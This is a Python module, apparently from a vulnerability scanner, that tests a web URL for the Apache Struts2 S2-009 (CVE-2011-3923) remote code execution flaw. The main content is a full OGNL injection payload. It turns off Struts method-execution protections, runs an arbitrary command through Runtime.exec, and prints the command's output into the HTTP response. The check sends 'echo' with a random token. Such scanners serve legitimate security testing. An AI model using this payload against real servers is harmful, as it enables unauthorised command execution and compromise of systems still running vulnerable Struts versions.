#!/usr/bin/env python3

from app.lib.request import request
from app.lib.encode import urlencode
from app.lib.common import get_capta, filter_str, get_useragent

class S2_009_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-009漏洞,又名CVE-2011-3923漏洞',
            'description': 'Struts2 S2-009漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.1',
            'date': '2012-01-20',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if  '.action' not in self.url:
            self.url = self.url + '/ajax/example5.action'
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent()
        }
        self.payload =  '?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27{cmd}%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'

    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_url = self.url + self.payload.format(cmd = urlencode('echo' + ' ' + self.capta))
            check_res = await request.get(check_url, headers = self.headers)
            check_str = filter_str(list(await check_res.text()))
            if check_res.status == 200 and len(check_str) < 100 and self.capta in check_str:
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_009 = S2_009_BaseVerify('http://127.0.0.1:8080')
    S2_009.check()